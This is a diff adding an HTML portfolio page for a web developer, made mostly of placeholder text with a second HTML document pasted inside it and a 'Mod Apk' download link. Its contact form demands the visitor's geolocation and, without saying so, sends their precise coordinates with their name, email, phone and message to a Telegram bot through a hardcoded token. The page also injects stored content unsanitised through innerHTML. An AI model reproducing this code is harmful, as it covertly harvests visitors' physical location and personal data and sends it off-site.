@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sushil Choudhary  - Web Developer</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            background-image: url('https://firebasestorage.googleapis.com/v0/b/sushiljat01-af741.appspot.com/o/compressed_image.jpg?alt=media&token=fe6ca104-1d94-4282-9d17-e38b0327d572');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            overflow-x: hidden;
+        }
+
+         body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+        }
+
+        .header {
+    background-color: #000;
+    padding: 20px;
+    text-align: center;
+    position: fixed; /* Make the header fixed */
+    top: 0; /* Position it at the top of the screen */
+    width: 91%; /* Ensure it spans the full width of the screen */
+    z-index: 1000; /* Ensure it stays above other content */
+}
+
+
+        .header .logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .header .logo span {
+            color: #00ffff;
+        }
+
+        .header .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            position: absolute;
+            right: 20px;
+            top: 20px;
+        }
+
+        .menu-icon .bar {
+            display: block;
+            width: 25px;
+            height: 3px;
+            margin: 5px auto;
+            background-color: #00ffff;
+        }
+
+        .overlay {
+            height: 0%;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: rgba(0,0,0,0.9);
+            overflow-y: hidden;
+            transition: 0.5s;
+            z-index: 1;
+        }
+
+        .overlay-content {
+            position: relative;
+            top: 25%;
+            width: 100%;
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .overlay a {
+            padding: 8px;
+            text-decoration: none;
+            font-size: 36px;
+            color: #fff;
+            display: block;
+            transition: 0.3s;
+        }
+
+        .overlay a:hover, .overlay a:focus {
+            color: #00ffff;
+        }
+
+        .overlay .closebtn {
+            position: absolute;
+            top: 20px;
+            right: 45px;
+            font-size: 60px;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+
+        .overlay {
+            height: 0%;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: rgba(0, 0, 0, 0.9);
+            overflow-y: hidden;
+            transition: 0.5s;
+            z-index: 999;
+        }
+
+        .overlay-content {
+            position: relative;
+            top: 25%;
+            width: 100%;
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .overlay a {
+            padding: 8px;
+            text-decoration: none;
+            font-size: 36px;
+            color: #818181;
+            display: block;
+            transition: 0.3s;
+        }
+
+        .overlay a:hover, .overlay a:focus {
+            color: #00f3ff;
+        }
+
+        .overlay .closebtn {
+            position: absolute;
+            top: 20px;
+            right: 45px;
+            font-size: 60px;
+        }
+
+        .content {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+        }
+
+        #home {
+            text-align: center;
+            padding: 100px 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid #00f3ff;
+            border-radius: 15px;
+            box-shadow: 0 0 15px #00f3ff;
+        }
+
+        .intro img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 3px solid #00f3ff;
+            margin-bottom: 20px;
+        }
+
+        .intro h1 span {
+            color: #00f3ff;
+        }
+
+        .intro h2 span {
+            color: #00ffab;
+        }
+
+        .intro p {
+            max-width: 600px;
+            margin: 20px auto;
+        }
+
+        .socials a {
+            color: #00f3ff;
+            margin: 0 10px;
+            text-decoration: none;
+            font-size: 24px;
+        }
+
+        .actions button {
+            background: linear-gradient(45deg, #00f3ff, #00ffab);
+            border: none;
+            color: #000;
+            padding: 15px 30px;
+            margin: 20px;
+            cursor: pointer;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #00ffab, 0 0 20px #00f3ff;
+            transition: box-shadow 0.3s, transform 0.3s;
+        }
+
+        .actions button:hover {
+            box-shadow: 0 0 20px #00ffab, 0 0 40px #00f3ff;
+            transform: scale(1.1);
+        }
+
+        #services, #contact {
+            background-color: rgba(26, 26, 26, 0.9);
+            padding: 50px 20px;
+            text-align: center;
+            border-radius: 15px;
+            box-shadow: 0 0 15px #00f3ff;
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            color: #00f3ff;
+            margin-bottom: 30px;
+        }
+
+        .service-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .service {
+            background-color: #333;
+            border-radius: 10px;
+            margin: 10px;
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+            border: 2px solid #00f3ff;
+        }
+
+        .service h3 {
+            color: #00f3ff;
+        }
+
+        .service p {
+            color: #bfbfbf;
+        }
+
+        .service a {
+            display: inline-block;
+            background-color: #00f3ff;
+            color: #000;
+            padding: 10px 20px;
+            margin-top: 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .service a:hover {
+            background-color: #00ffab;
+            color: #fff;
+        }
+
+        .contact-form {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .contact-form input, .contact-form textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #2b2b2b;
+            color: #fff;
+        }
+
+        .contact-form button {
+            background-color: #00f3ff;
+            border: none;
+            color: #000;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s, box-shadow 0.3s;
+        }
+
+        .contact-form button:hover {
+            background-color: #00ffab;
+            box-shadow: 0 0 10px #00f3ff, 0 0 20px #00ffab;
+        }
+
+        footer {
+            text-align: center;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            border-top: 1px solid #00f3ff;
+        }
+    </style>
+</head>
+<body><div class="header">
+        <div class="logo">Sushil <span>Choudhary</span></div>
+        <div class="menu-icon" onclick="toggleNav()">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+    </div>
+<div id="myNav" class="overlay">
+        <a href="javascript:void(0)" class="closebtn" onclick="toggleNav()">&times;</a>
+        <div class="overlay-content">
+            <a href="#home" onclick="toggleNav()">Home</a>
+            <a href="#services" onclick="toggleNav()">Services</a>
+            <a href="#journey" onclick="toggleNav()">My Journey</a>
+            <a href="#skills" onclick="toggleNav()">My Skills</a>
+            <a href="#contact" onclick="toggleNav()">Contact</a>
+            <a href="download.html" onclick="toggleNav()">Mod Apk</a>
+            <div id="dynamicPages"></div>
+        </div>
+    </div>
+    
+
+    <div class="content">
+        <section id="home">
+            <div class="intro">
+                <img src="https://firebasestorage.googleapis.com/v0/b/sushiljat01-af741.appspot.com/o/IMG_20240712_124110.png?alt=media&token=6ed96923-2ae7-4c7f-b869-edd52fad86e2" alt="Sushil Choudhary ">
+                <h1>Hi, It's <span>Sushil</span></h1>
+                <h2>I'm a <span>Web Developer</span></h2>
+                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Magnis quibusdam tempore iste veniam hic commodi autem quod odit id, exercitationem perferendis impedit earum nulla reprehenderit nisi modi officiis rem corporis?</p>
+                <div class="socials">
+               <div class="actions">
+                    <a href="https://www.instagram.com/p/Cj4to9WvKyP/?utm_source=ig_web_copy_link"><button>Instagram</button></a>
+                 <div class="actions">
+            </div>
+                <div class="actions">
+                    <button onclick="scrollToContact()">Contact</button>
+                </div>
+            </div>
+        </section>
+
+        <section id="services">
+            <h2 class="section-title">Our Services</h2>
+            <div class="service-container">
+                <div class="service">
+                    <h3>Web Development</h3>
+                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Magnis quibusdam tempore iste veniam hic commodi autem quod odit id.</p>
+                    <a href="#">Read More</a>
+                </div>
+                <div class="service">
+                    <h3>Graphic Design</h3>
+                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Magnis quibusdam tempore iste veniam hic commodi autem quod odit id.</p>
+                    <a href="#">Read More</a>
+                </div>
+                <div class="service">
+                    <h3>Digital Marketing</h3>
+                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Magnis quibusdam tempore iste veniam hic commodi autem quod odit id.</p>
+                    <a href="#">Read More</a>
+                </div>
+            </div>
+        </section>
+        
+        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sushil Choudhary - Web Developer</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            background-image: url('https://firebasestorage.googleapis.com/v0/b/sushiljat01-af741.appspot.com/o/compressed_image.jpg?alt=media&token=fe6ca104-1d94-4282-9d17-e38b0327d572');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            overflow-x: hidden;
+        }
+
+        .content {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+        }
+
+        .section {
+            padding: 50px 20px;
+            text-align: center;
+            background: rgba(26, 26, 26, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 0 15px #00f3ff;
+            margin-bottom: 20px;
+        }
+
+        .section h2 {
+            color: #00f3ff;
+            margin-bottom: 30px;
+        }
+
+        .timeline {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .timeline-item {
+            background: #333;
+            border: 2px solid #00f3ff;
+            border-radius: 10px;
+            margin: 10px;
+            padding: 20px;
+            width: 300px;
+        }
+
+        .timeline-item h3 {
+            color: #00f3ff;
+        }
+
+        .timeline-item p {
+            color: #bfbfbf;
+        }
+
+        .skills {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .skills-container {
+            background: #333;
+            border: 2px solid #00f3ff;
+            border-radius: 10px;
+            margin: 10px;
+            padding: 20px;
+            width: 300px;
+        }
+
+        .skills-container h3 {
+            color: #00f3ff;
+            margin-bottom: 20px;
+        }
+
+        .skill-bar {
+            background: #444;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .skill-bar-inner {
+            background: #00f3ff;
+            height: 20px;
+            border-radius: 5px;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <section class="section" id="journey">
+            <h2>My Journey</h2>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <h3>Master Degree - University</h3>
+                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
+                </div>
+                <div class="timeline-item">
+                    <h3>Web Developer - Company</h3>
+                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
+                </div>
+                <div class="timeline-item">
+                    <h3>Master Degree - University</h3>
+                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
+                </div>
+                <div class="timeline-item">
+                    <h3>Web Developer - Company</h3>
+                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="skills">
+            <h2>My Skills</h2>
+            <div class="skills">
+                <div class="skills-container">
+                    <h3>Coding Skills</h3>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 95%;"></div>
+                    </div>
+                    <p>HTML</p>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 80%;"></div>
+                    </div>
+                    <p>CSS</p>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 85%;"></div>
+                    </div>
+                    <p>JavaScript</p>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 75%;"></div>
+                    </div>
+                    <p>Python</p>
+                </div>
+
+                <div class="skills-container">
+                    <h3>Professional Skills</h3>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 95%;"></div>
+                    </div>
+                    <p>Web Design</p>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 67%;"></div>
+                    </div>
+                    <p>Web Development</p>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 85%;"></div>
+                    </div>
+                    <p>Graphic Design</p>
+                    <div class="skill-bar">
+                        <div class="skill-bar-inner" style="width: 60%;"></div>
+                    </div>
+                    <p>SEO Marketing</p>
+                </div>
+            </div>
+        </section>
+    </div>
+</body>
+</html>
+
+
+        <section id="contact">
+            <h2 class="section-title">Contact Me!</h2>
+            <div class="contact-form">
+                <input type="text" id="fullname" placeholder="Full Name" required><br><br>
+                <input type="email" id="email" placeholder="Email Address" required><br><br>
+                <input type="text" id="phone" placeholder="Mobile Number" required><br><br>
+                <input type="text" id="subject" placeholder="Email Subject" required><br><br>
+                <textarea id="message" rows="5" placeholder="Your Message" required></textarea><br><br>
+                <button onclick="sendMessage()">Send Message</button>
+            </div>
+        </section>
+        
+        <section id="newPages">
+            <h2 class="section-title">New Pages</h2>
+            <div id="pagesContent"></div>
+        </section>
+
+        <footer>
+            <p>Copyright &copy; 2024 by Sushil Choudhary . All Rights Reserved.</p>
+        </footer>
+    </div>
+
+    <script>
+        function toggleNav() {
+            var nav = document.getElementById("myNav");
+            if (nav.style.height === "100%") {
+                nav.style.height = "0%";
+            } else {
+                nav.style.height = "100%";
+            }
+        }
+        function toggleNav() {
+            const overlay = document.getElementById("myNav");
+            if (overlay.style.height === "100%") {
+                overlay.style.height = "0%";
+            } else {
+                overlay.style.height = "100%";
+            }
+        }
+
+        function scrollToContact() {
+            document.getElementById('contact').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Visitor tracking
+        function trackVisit() {
+            const today = new Date().toLocaleDateString();
+            let visits = JSON.parse(localStorage.getItem('visits')) || [];
+            visits.push(today);
+            localStorage.setItem('visits', JSON.stringify(visits));
+        }
+        trackVisit();
+
+        // Load new pages
+        function loadNewPages() {
+            let pages = JSON.parse(localStorage.getItem('pages')) || [];
+            let dynamicPages = document.getElementById('dynamicPages');
+            let pagesContent = document.getElementById('pagesContent');
+
+            dynamicPages.innerHTML = ''; // Clear any existing links
+            pagesContent.innerHTML = ''; // Clear any existing content
+
+            pages.forEach(page => {
+                let link = document.createElement('a');
+                link.href = `#${page.title.replace(/\s+/g, '-')}`;
+                link.textContent = page.title;
+                dynamicPages.appendChild(link);
+
+                let section = document.createElement('section');
+                section.id = page.title.replace(/\s+/g, '-');
+                section.className = 'dynamic-section';
+                section.innerHTML = `<h2>${page.title}</h2><p>${page.content}</p>`;
+                pagesContent.appendChild(section);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', loadNewPages);
+
+        function scrollToContact() {
+            document.getElementById('contact').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function sendMessage() {
+            // Get form data
+            const fullname = document.getElementById('fullname').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const subject = document.getElementById('subject').value;
+            const message = document.getElementById('message').value;
+
+            // Construct message with location data
+            let text = `New contact message:\n\n`;
+            text += `Name: ${fullname}\n`;
+            text += `Email: ${email}\n`;
+            text += `Phone: ${phone}\n`;
+            text += `Subject: ${subject}\n`;
+            text += `Message: ${message}\n`;
+
+            // Get user's location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    // Construct Google Maps link
+                    const googleMapsLink = `https://maps.google.com/maps?q=${latitude},${longitude}`;
+                    // Append location link to message
+                     text += `\n\nLocation: ${googleMapsLink}\n`;
+                    text += `Latitude: ${latitude}\n`;
+                    text += `Longitude: ${longitude}\n`;
+                    text += `Accuracy: ${accuracy} meters\n`;
+
+                    // Send message to Telegram
+                    sendTelegramMessage(text);
+                }, (error) => {
+                    console.error('Error getting location:', error.message);
+                    alert('Failed to get your location. Please allow location access and try again.');
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+                alert('Geolocation is not supported by your browser. Please use a different browser or device.');
+            }
+        }
+
+        function sendTelegramMessage(message) {
+            // Replace with your actual bot token and chat ID
+            const botToken = '7455670410:AAFyu4dCgrvfZXhrwRf9WAjn7g1mJyKnqdQ';
+            const chatId = '1691680798';
+
+            // Telegram API endpoint URLs
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Parameters for the sendMessage method
+            const params = {
+                chat_id: chatId,
+                text: message,
+            };
+
+            // Perform the HTTP POST request to send the message
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+                alert('Message sent successfully!');
+                // Optionally, clear the form fields after successful submission
+                document.getElementById('fullname').value = '';
+                document.getElementById('email').value = '';
+                document.getElementById('phone').value = '';
+                document.getElementById('subject').value = '';
+                document.getElementById('message').value = '';
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+                alert('Failed to send message. Please try again later.');
+            });
+        }
+    </script>
+</body>
+</html>
+                    
